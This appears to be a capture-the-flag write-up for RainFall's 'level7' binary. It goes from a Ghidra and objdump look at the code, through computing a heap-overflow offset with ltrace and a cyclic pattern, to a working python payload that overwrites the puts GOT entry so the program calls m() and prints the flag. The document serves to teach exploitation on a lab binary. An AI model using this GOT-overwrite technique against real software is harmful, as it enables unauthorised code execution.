This binary needs two arguments as we can see with the two strcpy().

```sh
  strcpy((char *)puVar1[1],*(char **)(param_2 + 4)); #argv[1], each pointer is worth 4 bytes
  strcpy((char *)puVar3[1],*(char **)(param_2 + 8)); #argv[2]
```

By having a quick look into the code in Ghidra, we notice that the flag is fetched by fgets but it writes into a variable called c, and the unused m() calls printf() into this c variable, where there is our password.
The puts() is useless, so we can change it by doing a **GOT overwrite** so that it calls the m() function instead.

```
08048400 <puts@plt>:
 8048400:	ff 25 28 99 04 08    	jmp    *0x8049928
 8048406:	68 28 00 00 00       	push   $0x28
 804840b:	e9 90 ff ff ff       	jmp    80483a0 <_init+0x34>

 080484f4 <m>:
 80484f4:	55                   	push   %ebp
 80484f5:	89 e5                	mov    %esp,%ebp
 80484f7:	83 ec 18             	sub    $0x18,%esp
 80484fa:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
 8048501:	e8 ca fe ff ff       	call   80483d0 <time@plt>
 8048506:	ba e0 86 04 08       	mov    $0x80486e0,%edx
 804850b:	89 44 24 08          	mov    %eax,0x8(%esp)
 804850f:	c7 44 24 04 60 99 04 	movl   $0x8049960,0x4(%esp)
 8048516:	08 
 8048517:	89 14 24             	mov    %edx,(%esp)
 804851a:	e8 91 fe ff ff       	call   80483b0 <printf@plt>
 804851f:	c9                   	leave  
 8048520:	c3                   	ret  
```

The payload follows the pattern:
```
./level7 (offset + puts GOT) (m address)
```

Thanks to a tool https://wiremask.eu/tools/buffer-overflow-pattern-generator/ we can compute the offset:
```sh
ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag^C
level7@RainFall:~$ ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
__libc_start_main(0x8048521, 2, 0xbffff724, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                        = 0x0804a008
malloc(8)                                        = 0x0804a018
malloc(8)                                        = 0x0804a028
malloc(8)                                        = 0x0804a038
strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...) = 0x0804a018
strcpy(0x37614136, NULL <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

We copy paste 0x37614136, and it gives us an offset of 20.

Therefore, the payload to get the flag is:

```sh
./level7 $(python -c 'print "F" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
```

